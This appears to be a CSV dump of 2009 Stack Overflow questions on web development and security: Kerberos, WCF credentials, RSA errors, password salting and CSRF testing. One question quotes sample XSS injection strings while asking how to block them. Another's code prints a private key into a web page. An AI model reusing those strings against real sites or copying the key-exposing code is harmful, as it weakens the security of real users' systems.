Id,PostTypeId,AcceptedAnswerId,ParentId,CreationDate,DeletionDate,Score,ViewCount,Body,OwnerUserId,OwnerDisplayName,LastEditorUserId,LastEditorDisplayName,LastEditDate,LastActivityDate,Title,Tags,AnswerCount,CommentCount,FavoriteCount,ClosedDate,CommunityOwnedDate
"886115","1","","","2009-05-20 04:22:32","","0","8175","<p>I wanted to write a program where an Excel sheet is imported onto a webpage. Also the look and feel of the webpage should be the same as that of the Excel sheet. The whole excel sheet should be displayed on the webpage.</p>

<p>Is there any package for Java where we can import the Excel sheet and print its data and its sheet onto the webpage?</p>
","66593","","198633","","2012-10-12 17:04:52","2012-10-12 17:04:52","Displaying an Excel sheet on a webpage using JSP/Servlets?","<java><excel><java-ee><web>","4","1","","2015-02-25 19:03:06",""
"906539","1","906750","","2009-05-25 12:28:33","","14","11987","<ol>
<li><p>My first question is, I often read about people using multiple dedicated servers to run their websites, and process queries from users. But how do they exactly do this? I mean, when I enter a domain name, a DNS resolves maps that to an IP address, but I am lost after that.. is there some kind of master/slave architecture there to load balance incoming requests amongst the (potentially) hundreds of servers?</p></li>
<li><p>If that's the case, how do the various servers, share data (database for e.g.)? Will they be connected to the same hard disk?</p></li>
</ol>
","112083","","3758439","","2016-05-28 04:21:40","2016-05-28 04:21:40","How do multiple servers work in sync for web application?","<architecture><server><server-side><backend>","2","0","9","",""
"940905","1","940923","","2009-06-02 17:41:55","","209","207782","<p>Assuming a URL of:</p>

<pre><code>www.example.com/?val=1#part2
</code></pre>

<p>PHP can read the request variables <code>val1</code> using the GET array.</p>

<p>Is the hash value <code>part2</code> also readable? Or is this only upto the browser and JavaScript?</p>
","41021","","1591669","","2016-08-14 19:49:12","2019-08-07 21:51:19","Can I read the hash portion of the URL on my server-side application (PHP, Ruby, Python, etc.)?","<http><url><web><language-agnostic><uri-fragment>","13","0","37","",""
"942011","1","942032","","2009-06-02 21:29:05","","52","80022","<p>I am saving user-submitted HTML (in a database). I must prevent Javascript injection attacks.  The most pernicious I have seen is the script in a style=""expression(...)"".</p>

<p>In addition to this, a fair amount of valid user content will include special characters and XML constructs, so I'd like to avoid a white-list approach if possible. (Listing every allowable HTML element and attribute).</p>

<p>Examples of Javascript attack strings are:</p>

<p>1)</p>

<blockquote>
  <p>""Hello, I have a
  &lt;script&gt;alert(""bad!"")&lt;/script&gt;
  problem with the &lt;dog&gt;
  element...""</p>
</blockquote>

<p>2)</p>

<blockquote>
  <p>""Hi, this &lt;b
  style=""width:expression(alert('bad!'))""&gt;dog&lt;/b&gt;
  is black.""</p>
</blockquote>

<p>Is there a way to prevent such Javascript, and leave the rest intact?</p>

<p>The only solution I have so far is to use a regular expression to remove certain patterns.  It solves case 1, but not case 2.</p>

<p><strong>Edit:</strong>
Sorry, forgot to mention environment - it's essentially the MS stack:</p>

<ul>
<li>SQL Server 2005 </li>
<li>C# 3.5  (ASP.NET)</li>
<li>Javascript (obviously) and jQuery.</li>
</ul>

<p>I would like the chokepoint to be the ASP.NET layer - anyone can craft a bad HTTP request.</p>

<p><strong>Edit 2:</strong></p>

<p>Thanks for the links everyone.  Assuming that I can define my list (he content will include many mathematical and programming constructs, so a whitelist is going to be very annoying)  I still have a question here:</p>

<p>What kind of parser will allow me to just remove the ""bad"" parts?  The bad part could be an entire element, but then what about these scripts that reside in the attributes.  I can't remove &lt; a hrefs > willy-nilly.</p>
","111934","","111934","","2009-06-02 22:00:59","2017-09-13 12:13:13","How to prevent Javascript injection attacks within user-generated HTML","<javascript><html><regex><parsing><code-injection>","7","0","36","",""
"950928","1","950966","","2009-06-04 14:23:39","","25","63398","<p>I have a WCF service using BasicHttpBinding with Windows authentication.
Most clients are domain accounts and connect to the service using their default credentials.</p>

<p>Now I want to connect to the service from an ASP.NET client that is running under a local account.  I want to connect to the WCF service using windows credentials (domain\user and password) that are available to the ASP.NET application.</p>

<p>I know I can do this in code using ClientBase&lt;T>.ClientCredentials.</p>

<p>Is there a way to specify the credentials (domain\user and password) in the client's web.config file so I don't have to change the code?</p>

<p><strong>EDIT</strong></p>

<p>If it can't be done in the configuration file, is there a way of using System.Net.ICredentials or System.Net.NetworkCredential as a credential for a WCF service?</p>

<p>The .NET Framework provides these as a homogenous way to provide network credentials, but with WCF this seems to have been thrown out in favour of a new incompatible system based on the unrelated System.ServiceModel.Description.ClientCredentials class.</p>

<p><strong>EDIT 2</strong></p>

<p>Accepting Marc's answer to the original question - it seems there is no way to do this in the client configuration file :(</p>

<p>I would see this as a deficiency in WCF - I don't accept that Microsoft should be deliberately discouraging us from putting credentials in the configuration file - after all they have to be stored somewhere, and the Framework includes facilities for encrypting the config file.  I guess I could create a custom BehaviorExtensionElement for this, but it ought to be available out of the box.</p>

<p>It's also a bit inconsistent: the system.net/mailSettings/smtp/network configuration element allows credentials to be specified, so why not WCF?</p>

<p>Regarding the second question about using System.Net.NetworkCredential, it seems from <a href=""http://devdump.wordpress.com/tag/wcf/"" rel=""noreferrer"">this blog</a> that it is possible, at least when using Windows authentication, with the following code:</p>

<pre><code>factory.Credentials.Windows.ClientCredential =
   new System.Net.NetworkCredential(name, password, domain);
</code></pre>
","13087","","13087","","2012-03-01 18:41:41","2016-06-01 01:57:50","How to specify Windows credentials in WCF client configuration file","<wcf><credentials>","6","0","6","",""
"954416","1","","","2009-06-05 05:48:09","","14","39475","<p>While decrypting text using <code>RSACryptoServiceProvider.Decrypt</code>, I am getting the error:</p>

<blockquote>
  <p>Error occurred while decoding OAEP padding.</p>
</blockquote>

<p>Here's my code:</p>

<pre><code>CspParameters cspParam = new CspParameters();

cspParam = new CspParameters();

cspParam.Flags = CspProviderFlags.UseMachineKeyStore;

clsCertificates cc = new clsCertificates();

string a = """";

cc.OpenStoreIE(ref a);

cc.SetProperties();

X509Certificate2 cert = new X509Certificate2();

cert = cc.x509_2Cert;

RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(cspParam);

//to gentrate private and public keys from the certificate

rsa.FromXmlString(cert.PublicKey.Key.ToXmlString(false));


String publicKey = rsa.ToXmlString(false); // gets the public key 
String privateKey = rsa.ToXmlString(true); // gets the private key working if paramter is false if true give error key is not valid for use in specified state

Response.Write(""&lt;Textarea rows=10 cols=100&gt;PUBLIC: "" + publicKey + ""&lt;/TextArea&gt;"");

Response.Write(""&lt;Textarea rows=10 cols=100&gt;PRIVATE: "" + privateKey + ""&lt;/Textarea&gt;"");

Response.Write(""&lt;BR&gt;Encrypting the string \""HelloThere\"" with the public Key:&lt;BR&gt;"");

String str = ""HelloThere"";

RSACryptoServiceProvider RSA2 = new RSACryptoServiceProvider(cspParam);



//---Load the Public key---

RSA2.FromXmlString(publicKey);

//working with the folowing line instead of above but i need the keys of he certificte

//RSA2.ToXmlString(true);

Byte[] EncryptedStrAsByt = RSA2.Encrypt(System.Text.Encoding.Unicode.GetBytes(str), true);

String EncryptedStr = System.Text.Encoding.Unicode.GetString(EncryptedStrAsByt);

Response.Write(""&lt;Textarea rows=10 cols=100&gt;Encrypted String: "" + EncryptedStr + ""&lt;/Textarea&gt;"");

Response.Write(""&lt;BR&gt;Decrypting the Encrypted String with the Private key:&lt;BR&gt;"");



RSACryptoServiceProvider RSA3 = new RSACryptoServiceProvider(cspParam);



//---Load the Private key---

RSA3.FromXmlString(privateKey);

//working with the folowing line instead of above but i need the keys of he certificte

//RSA3.ToXmlString(true);

Byte[] DecryptedStrAsByt = RSA3.Decrypt(EncryptedStrAsByt, true );//Error if true then error is error occured while decoding the OAE$P padding and if false then error is bad key i am using windows xp so it should be true.

String DecryptedStr = System.Text.Encoding.Unicode.GetString(DecryptedStrAsByt);

Response.Write(""&lt;Textarea rows=10 cols=100&gt;Decrypted String: "" + DecryptedStr + ""&lt;/Textarea&gt;"");
</code></pre>

<p>The above is works if I am not using the keys of my digital certificate. but if the keys are from the digital certificate, I get the OAEP padding error.</p>

<p>Note: This question is in continuation of the <a href=""https://stackoverflow.com/questions/949907/error-occurred-while-decoding-oaep-padding"">Error occurred while decoding OAEP padding</a> question</p>
","117256","","2479481","","2018-06-05 16:59:59","2018-10-10 21:35:11","Error occurred while decoding OAEP padding","<c#><encryption><rsa><digital-signature><rsacryptoserviceprovider>","8","10","2","",""
"970133","1","973375","","2009-06-09 13:35:38","","36","23708","<p>Grails 1.x allows using external configuration files by setting the <strong>grails.config.locations</strong> directive. Is there a similar approach available for externalizing the database configuration in Datasource.groovy (without setting up JNDI)?</p>

<p>It would prove helpful to be able to configure DB credentials in a simple configuration file outside the application.</p>

<p>Thanks in advance!</p>
","102170","","","","","2016-07-28 10:13:54","Externalizing Grails Datasource configuration","<configuration><grails><datasource><external><credentials>","4","0","19","",""
"1026432","1","1026440","","2009-06-22 10:20:33","","8","9062","<p>I'm getting two different hashes of the same xml document when I directly canonicalize some xml than when I perform a digital signature on it which also performs the same canonicalization algoririth on the xml before hashing it?  I worked out that the digital signature canonicalization includes the new line characters '\n' and spacing characters when canonicalizing and the direct algorithm does not. </p>

<p>Including the new line characters + spaces is not in the canonicalization specification though?  I'm specifically looking at this version <a href=""http://www.w3.org/TR/2001/REC-xml-c14n-20010315"" rel=""noreferrer"">http://www.w3.org/TR/2001/REC-xml-c14n-20010315</a></p>

<p>Does anyone know what is going on?  I've included the xml doc and both implementations of the code so you can see.</p>

<p>This is really puzzling me and I'd like to know why, am I missing something obvious?</p>

<pre><code>&lt;root&gt;
  &lt;child1&gt;some text&lt;/child1&gt;
  &lt;child2 attr=""1"" /&gt;
&lt;/root&gt;
</code></pre>

<p>The direct canonicalization code</p>

<pre><code>using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Xml;
using System.Security.Cryptography.Xml;
using System.Security.Cryptography;
using System.IO;
using System.ComponentModel;

namespace XML_SignatureGenerator
{
    class XML_C14N
    {
        private String _filename;
        private Boolean isCommented = false;
        private XmlDocument xmlDoc = null;

        public XML_C14N(String filename)
        {
            _filename = filename;
            xmlDoc = new XmlDocument();
            xmlDoc.Load(_filename);
        }

        //implement this spec http://www.w3.org/TR/2001/REC-xml-c14n-20010315
        public String XML_Canonalize(System.Windows.Forms.RichTextBox tb)
        {
            //create c14n instance and load in xml file
            XmlDsigC14NTransform c14n = new XmlDsigC14NTransform(isCommented);

            c14n.LoadInput(xmlDoc);

            //get canonalised stream
            Stream s1 = (Stream)c14n.GetOutput(typeof(Stream));
            SHA1 sha1 = new SHA1CryptoServiceProvider();
            Byte[] output = sha1.ComputeHash(s1);

            tb.Text = Convert.ToBase64String(output);

            //create new xmldocument and save
            String newFilename = _filename.Substring(0, _filename.Length - 4) + ""C14N.xml"";
            XmlDocument xmldoc2 = new XmlDocument();
            xmldoc2.Load(s1);
            xmldoc2.Save(newFilename);

            return newFilename;
        }

        public void set_isCommented(Boolean value)
        {
            isCommented = value;
        }

        public Boolean get_isCommented()
        {
            return isCommented;
        }
    }
}
</code></pre>

<p>The xml digital signature code</p>

<pre><code>using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Xml;
using System.Security.Cryptography;
using System.Security.Cryptography.Xml;

namespace XML_SignatureGenerator
{
class xmlSignature
    {
        public xmlSignature(String filename)
        {
            _filename = filename;
        }

        public Boolean SignXML()
        {
            RSACryptoServiceProvider rsa =  new RSACryptoServiceProvider();
            XmlDocument xmlDoc = new XmlDocument();
            xmlDoc.PreserveWhitespace = true;
            String fname = _filename; //""C:\\SigTest.xml"";
            xmlDoc.Load(fname);

            SignedXml xmlSig = new SignedXml(xmlDoc);
            xmlSig.SigningKey = rsa;

            Reference reference = new Reference();
            reference.Uri = """";

            XmlDsigC14NTransform env = new XmlDsigC14NTransform(false);
            reference.AddTransform(env);

            xmlSig.AddReference(reference);
            xmlSig.ComputeSignature();

            XmlElement xmlDigitalSignature = xmlSig.GetXml();
            xmlDoc.DocumentElement.AppendChild(xmlDoc.ImportNode(xmlDigitalSignature, true));

            xmlDoc.Save(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + ""/SignedXML.xml"");

            return true;
        }
        private String _filename;
    }
}
</code></pre>

<p>Any idea would be great!  It's all C# code by the way.</p>

<p>Thanks in advance</p>

<p>Jon </p>
","1162133","","680925","","2011-08-05 15:05:23","2011-08-05 15:05:23","XML Canonicalization algorithm gives two difference results when called directly than when called as part of an xml digital signature?","<xml><digital-signature><xml-signature><canonical-form>","2","0","2","",""
"1032041","1","1032215","","2009-06-23 11:41:35","","10","12557","<p>I'm working on a calendar page that allows a user to click on a day, and enter an entry for that day with a form that pops up.</p>

<p>I'm no stranger to DOM manipulation with jQuery, but this is something I've done before and I'm beginning to wonder if there's a more efficient way to do this?</p>

<p>Would building the HTML manually within JavaScript be the most efficient way performancewise (I assume this is true, over using functions like appendTo() etc) or would creating a hidden construct within the DOM and then cloning it be better?</p>

<p>Ideally I want to know the optimal method of doing this to provide a balance between code neatness and performance.</p>

<p>Thanks,</p>

<p>Will</p>
","127522","","","","","2009-06-23 12:32:53","What is the best way to inject HTML into the DOM with jQuery?","<javascript><jquery><html><dom><code-injection>","3","0","5","",""
"1037009","1","1037289","","2009-06-24 08:05:42","","5","5533","<p>I'm using GSSAPI in Java in order to login to an LDAP server using Kerberos authentication. I'm a newbie to Kerberos, so I'm sorry if this is an obvious question, but I couldn't find anything clear enough on the internet.</p>

<p>I perform the following steps:</p>

<ol>
<li>Define Login configuration by setting the system property <code>""java.security.auth.login.config""</code> to the configuration file path.</li>
<li>Call <code>LoginContext.login()</code> with the name of the configuration and a self defined callback handler</li>
<li>In case login succeeded, ""pretend to be"" the subject (by using <code>Subject.doAs()</code>), and connect to the LDAP server by creating a new <code>InitialLDAPContext</code> with the appropriate environment variables.</li>
</ol>

<p>Now, My problem is I don't understand which step correlates to which kerberos action?
Is it correct to say that after the login action I only have a TGT? When do I get the service specific ticket?</p>

<p>Thanks,
Dikla</p>
","59241","","","","","2009-06-24 09:20:32","Kerberos Authentication in Java - does ""login"" action in java equals to ""kinit""?","<java><kerberos>","1","0","2","",""
"1072540","1","1074937","","2009-07-02 04:45:19","","12","11296","<p>I'm implementing a process elevation helper for Windows. It's a program that will run in elevated mode and launch other programs with administrator privileges without displaying additional UAC prompts. For security reasons, I want to make sure only binaries that are digitally signed with my company's Authenticode key can be executed.</p>

<p>The <a href=""http://msdn.microsoft.com/en-us/library/aa388208(VS.85).aspx"" rel=""noreferrer"">WinVerifyTrust</a> function gets me halfway there, but it only ensures that a binary is signed by <em>some</em> key that is part of Microsoft's chain of trust. Is there a relatively simple way to perform the Authenticode verification AND ensure that it is signed by our private key?</p>
","92631","","","","","2017-10-16 12:48:03","WinVerifyTrust to check for a specific signature?","<c><windows><digital-signature><winverifytrust>","4","0","5","",""
"1077413","1","1077469","","2009-07-03 01:07:03","","1","138","<p>I just implemented a ""remember me"" feature for a user login on a website. Most advice was to have the userid stored in a cookie, and then have some long, unguessable random key. If both of these match up, the user is considered authenticated.</p>

<p>Does having two strings actually help? Wouldn't a longer key do exactly the same thing? </p>

<p>In other words, aren't two keys equally susceptible to attacks as one longer key? (I imagine it would be the total length of the keys, regardless of how many you have)</p>

<p><strong>Note:</strong> There might be some DB query efficiency issues here too, e.g., looking up a big UUID in the DB is not as easy as looking up a small number. (On a tangential note, Gmail uses a six digit number as their one-time login token along with the username.)</p>
","8047","","","","","2009-07-04 00:51:24","Are two security keys better than one?","<security><token>","3","0","","",""
"1098282","1","1847055","","2009-07-08 14:03:23","","9","18226","<p>Every morning when i fire up my VM and IE (in my host OS) and go to my SP site it always logs me on automatically as DOMAIN\george which is a user I created for testing permissions.</p>

<p>So every morning after that I click ""sign in as a different user"" to sign in as my sys admin user instead and most days that is the only user I use.  <strong>Any idea why george's credentials are being cached?</strong></p>

<p>Part of ""firing up my VM"" is running a script that starts IIS as well as some services.  I'm not entirely sure SharePoint is responsible for this, could very well be ASP.Net.</p>

<p>EDIT: I've already tried clearing my cookies.</p>
","16162","","16162","","2012-03-28 14:45:06","2012-10-25 18:07:07","SharePoint caches incorrect credentials","<sharepoint><credentials>","5","0","1","",""
"1111193","1","1116766","","2009-07-10 18:26:22","","6","2830","<p>I'm using the CSRF hidden hash element with Zend_Form and trying to Unit Test the login but don't know how to write a Unit Test to include that element. Looked in the docs and read as many tutorials as I could find. I even <a href=""http://delicious.com/joedevon/zf+phpunit"" rel=""noreferrer"">delicioused them all</a>, but no one mentions this.</p>
","110337","","","","","2015-01-06 09:29:31","How do you Unit Test a Zend_Form that includes the CSRF form element?","<zend-framework><zend-form><phpunit><csrf>","5","2","3","",""
"1120575","1","1120586","","2009-07-13 16:30:07","","61","31792","<p>What is different between stack overflow and buffer overflow in Programming ?</p>
","120457","","17413","","2010-02-09 18:48:45","2019-04-06 15:08:33","What is the difference between a stack overflow and buffer overflow?","<operating-system><stack-overflow><buffer-overflow>","10","3","29","",""
"1177668","1","1178658","","2009-07-24 13:28:57","","8","1136","<p>Given a URI which has headers for caching properly configured.</p>

<p>If two users make a request to the same URI but provide two different sets of credentials, will a proxy cache the response per user+URI, or per URI, or not at all?</p>
","2443","","","","","2009-07-24 16:10:47","Will proxies cache HTTP Responses when authentication is provided?","<http><caching><credentials>","1","0","","",""
"1191112","1","1191124","","2009-07-27 23:01:43","","38","19369","<p>Suppose you were at liberty to decide how hashed passwords were to be stored in a DBMS.  Are there obvious weaknesses in a scheme like this one?</p>

<p>To create the hash value stored in the DBMS, take:</p>

<ul>
<li>A value that is unique to the DBMS server instance as part of the salt,</li>
<li>And the username as a second part of the salt,</li>
<li>And create the concatenation of the salt with the actual password,</li>
<li>And hash the whole string using the SHA-256 algorithm,</li>
<li>And store the result in the DBMS.</li>
</ul>

<p>This would mean that anyone wanting to come up with a collision should have to do the work separately for each user name and each DBMS server instance separately.  I'd plan to keep the actual hash mechanism somewhat flexible to allow for the use of the new <a href=""http://www.schneier.com/blog/archives/2009/07/sha-3_second_ro.html"" rel=""nofollow noreferrer"">NIST</a> standard hash algorithm (<a href=""http://csrc.nist.gov/groups/ST/hash/sha-3/index.html"" rel=""nofollow noreferrer"">SHA-3</a>) that is still being worked on.</p>

<p>The 'value that is unique to the DBMS server instance' need not be secret - though it wouldn't be divulged casually.  The intention is to ensure that if someone uses the same password in different DBMS server instances, the recorded hashes would be different. Likewise, the user name would not be secret - just the password proper.</p>

<p>Would there be any advantage to having the password first and the user name and 'unique value' second, or any other permutation of the three sources of data?  Or what about interleaving the strings?</p>

<p>Do I need to add (and record) a random salt value (per password) as well as the information above?  (Advantage: the user can re-use a password and still, probably, get a different hash recorded in the database.  Disadvantage: the salt has to be recorded.  I suspect the advantage considerably outweighs the disadvantage.)</p>

<p>There are quite a lot of related SO questions - this list is unlikely to be comprehensive:</p>

<ul>
<li><a href=""https://stackoverflow.com/questions/287517/encrypting-hashing-plain-text-passwords-in-database"">Encrypting/Hashing plain text passwords in database</a></li>
<li><a href=""https://stackoverflow.com/questions/401656/secure-hash-and-salt-for-php-passwords"">Secure hash and salt for PHP passwords</a></li>
<li><a href=""https://stackoverflow.com/questions/213380/the-necessity-of-hiding-the-salt-for-a-hash"">The necessity of hiding the salt for a hash</a></li>
<li><a href=""https://stackoverflow.com/questions/348704/client-side-md5-hash-with-time-salt"">Clients-side MD5 hash with time salt</a></li>
<li><a href=""https://stackoverflow.com/questions/30946/simple-password-encryption"">Simple password encryption</a></li>
<li><a href=""https://stackoverflow.com/questions/1645161/salt-generation-and-open-source-software"">Salt generation and Open Source software</a></li>
<li><a href=""https://dba.stackexchange.com/questions/7492/password-hashes-fixed-length-binary-fields-or-single-string-field"">Password hashes: fixed-length binary fields or single string field?</a></li>
</ul>

<p>I think that the answers to these questions support my algorithm (though if you simply use a random salt, then the 'unique value per server' and username components are less important).</p>
","15168","","-1","","2017-05-23 12:17:57","2019-04-10 16:39:05","Password hashing, salt and storage of hashed values","<security><encryption><hash><salt>","4","8","29","",""
"1194318","1","1194353","","2009-07-28 14:05:08","","16","4497","<p>If my table inside the database look like:</p>

<pre><code> userid uniqueidentifier
 username varchar(20)
 password varbinary(max)
</code></pre>

<p>When the user submit(to register), I send the user/pass to a stored procedure.</p>

<p>The stored procedure create a new GUID(Using <a href=""http://msdn.microsoft.com/en-us/library/ms190348(SQL.90).aspx"" rel=""noreferrer"">NEWID()</a>) then I use the <a href=""http://msdn.microsoft.com/en-us/library/ms174415(SQL.90).aspx"" rel=""noreferrer"">HashBytes</a>(sha1) function of SQL Server to create the password based on the GUID+password provided then I insert the values into the table above.</p>

<p>When the user submit(to login), I send the user/pass to a stored procedure.</p>

<p>The stored procedure look for the username and grab the userid to compare the hashbyte(sha1) of guid+password with the password field.</p>

<p>do you see any flaw inside that logic? </p>
","40868","","40868","","2009-07-28 15:07:28","2009-07-28 20:45:44","is a GUID a good salt? is my register/login process got any flaw?","<sql-server-2005><hash><guid><salt>","5","0","4","",""
"1219899","1","1219908","","2009-08-02 21:27:48","","241","66945","<p>I've always used a proper per-entry salt string when hashing passwords for database storage. For my needs, storing the salt in the DB next to the hashed password has always worked fine. </p>

<p>However, some people recommend that the salt be stored separately from the database. Their argument is that if the database is compromised, an attacker can still build a rainbow table taking a particular salt string into account in order to crack one account at a time. If this account has admin privileges, then he may not even need to crack any others.</p>

<p>From a security perspective, is it worth it to store salts in a different place? Consider a web application with the server code and DB on the same machine. If the salts are stored in a flat file on that machine, chances are that if the database is compromised, the salts file will be, too. </p>

<p>Are there any recommended solutions to this?</p>
","20745","","","","","2019-02-24 23:00:43","Where do you store your salt strings?","<security><authentication><hash><cryptography><salt>","5","9","91","",""
"1235829","1","1241552","","2009-08-05 21:22:40","","3","4944","<p>Please, can someone PLEASE give a simple, straight-forward way to enable ASP.NET > Kerberos > Sql Server? </p>

<p>We have clientMachine > webServer > databaseServer. The client is insistent that the site must pull the windows login and not prompt, hence the need for Kerberos and Integrated Authentication. It also MUST impersonate the user onto the db server, inducing a double-hop. </p>

<p>Our domain is a Windows 2003 domain, which as far as I can tell online, means Kerberos is enabled. And on a domain-joined computer,when logged in, kerbtray shows me I have a slew of tickets, so it is apparently working. </p>

<p>The web and database server computer accounts in AD are both ""trusted for delegation"".<br>
The AD user accounts which must access the system are both ""trusted for delegation"".<br>
When it is all working, I will add more users, for now two is it. </p>

<p>The Sql Server instance is running under LocalSystem on the database server, which as near as i can tell online, means it does NOT require messing with those SPN things at all.  </p>

<p>Yet, when i try to log in with either user, i get</p>

<pre><code>Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'. 
</code></pre>

<p>indicating a double-hop failure. This is furthered by the fact that in the application log on the db server there are a slew of entries from ""MSSQL"" saying the same thing. </p>

<p>I really can't believe how hard this is... i mean, IIS, SQL and Windows are all Microsoft, can't they talk better??? </p>

<p>So in summary, i have <ul>
<li>a kerberos domain,<br>
<li>db and web server both trusted for delegation<br>
<li>users trusted for delegation<br>
<li>users in a AD group<br>
<li>AD group as a login in sql (and user in db)<br>
<li>IIS with Anonymous off, Integrated on, Basic and Digest off
<li>IE with Enable Integrated on
</ul></p>
","80209","","","","","2017-03-21 10:30:01","asp.net via kerberos integrated windows authentication to sql server","<asp.net><sql-server><windows-authentication><kerberos><integrated-security>","3","0","3","",""
"1258550","1","1258556","","2009-08-11 05:17:58","","77","165407","<p><strong>Edit: I've added the source for the example.</strong></p>

<p>I came across <a href=""http://publib.boulder.ibm.com/infocenter/iadthelp/v7r0/index.jsp?topic=/com.ibm.etools.iseries.langref.doc/rzan5mst269.htm"" rel=""noreferrer"">this example</a>:</p>

<pre><code>char source[MAX] = ""123456789"";
char source1[MAX] = ""123456789"";
char destination[MAX] = ""abcdefg"";
char destination1[MAX] = ""abcdefg"";
char *return_string;
int index = 5;

/* This is how strcpy works */
printf(""destination is originally = '%s'\n"", destination);
return_string = strcpy(destination, source);
printf(""after strcpy, dest becomes '%s'\n\n"", destination);

/* This is how strncpy works */
printf( ""destination1 is originally = '%s'\n"", destination1 );
return_string = strncpy( destination1, source1, index );
printf( ""After strncpy, destination1 becomes '%s'\n"", destination1 );
</code></pre>

<p>Which produced this output:</p>

<pre>destination is originally = 'abcdefg'
After strcpy, destination becomes '123456789'

destination1 is originally = 'abcdefg'
After strncpy, destination1 becomes '12345fg'
</pre>

<p>Which makes me wonder why anyone would want this effect. It looks like it would be confusing. This program makes me think you could basically copy over someone's name (eg. Tom Brokaw) with Tom Bro763.  </p>

<p><strong>What are the advantages of using</strong> <code>strncpy()</code> <strong>over</strong> <code>strcpy()</code>?</p>
","56555","","3204551","","2015-02-21 17:36:53","2017-03-24 13:43:25","Why should you use strncpy instead of strcpy?","<c><buffer-overflow><strcpy><c89><strncpy>","10","7","44","",""
"1277791","1","1278164","","2009-08-14 13:16:46","","2","3392","<p>I'm developing WCF web service that checks if a certificate in XML signature is valid.
XML is signed with qualified and valid X509 certificate. While I am running service within Visual Studio development environment X509Certificate2.Verify() and X509Chain.Build() methods return TRUE. But when I publish my service under IIS these methods return FALSE. What I am doing wrong or what is missing? Here is my validation code:</p>

<pre><code>    public static void VerifyXml(XmlDocument xDoc)
    {
        // Create a new SignedXml object and pass it
        // the XML document class.
        SignedXml signedXml = new SignedXml(xDoc);

        // Find the ""Signature"" node and create a new
        // XmlNodeList object.
        XmlNodeList nodeList = xDoc.GetElementsByTagName(""Signature"");

        // Load the first &lt;signature&gt; node.  
        signedXml.LoadXml((XmlElement)nodeList[0]);

        IEnumerable&lt;KeyInfoX509Data&gt; x509Data = signedXml.KeyInfo.Cast&lt;KeyInfoX509Data&gt;();
        KeyInfoX509Data info = x509Data.First&lt;KeyInfoX509Data&gt;();
        X509Certificate2 cert = info.Certificates[0] as X509Certificate2;

        bool certIsValid = cert.Verify();
        // Here I receive TRUE in development environment and FALSE under IIS
        if (!certIsValid)
            throw new X509Exception(""Invalid certificate"");

        bool chainIsValid = false;
        X509Chain chain = new X509Chain();
        chain.ChainPolicy.RevocationFlag = X509RevocationFlag.EntireChain;
        chain.ChainPolicy.RevocationMode = X509RevocationMode.Online;
        chain.ChainPolicy.UrlRetrievalTimeout = new TimeSpan(0, 1, 0);
        chain.ChainPolicy.VerificationFlags = X509VerificationFlags.NoFlag;
        chainIsValid = chain.Build(cert);
        // Here I also receive TRUE in development environment and FALSE under IIS
        if (!chainIsValid)
            throw new X509Exception(""Chain is invalid"");

        // Check the signature
        bool signatureOK = signedXml.CheckSignature(cert, false);
        if (!signatureOK)
            throw new X509Exception(""Signature is invalid"");
     }
</code></pre>

<p>Any ideas?
Thanks</p>
","","user156491","","","","2011-01-27 04:10:35","X509Certificate2 validation on web service","<xml><wcf><web-services><digital-signature><x509certificate2>","1","0","1","",""
"1341908","1","","","2009-08-27 15:40:42","","2","5095","<p>I do not want to pass GET or POST variables to a script. I want to use the file name and use it to lookup the product from the php script for example:</p>

<p><code>......./DELL1500.php
......./COMPAQ1213.php</code></p>

<p>I have three questions:</p>

<ol>
<li><p>Where does PHP get the data from <code>$_SERVER[""SCRIPT_NAME""]</code> is it from the server or the clients browser?</p></li>
<li><p>Can anyone think of any security issues of using this?</p></li>
<li><p>Could this in anyway be incompatible with any older browsers. I assume not if its provided by the server?</p></li>
</ol>
","","Cameronasmith","608639","","2017-02-01 21:18:39","2017-02-01 21:18:39","Is it safe to use $_SERVER[""SCRIPT_NAME""]","<php><code-injection>","4","3","","",""
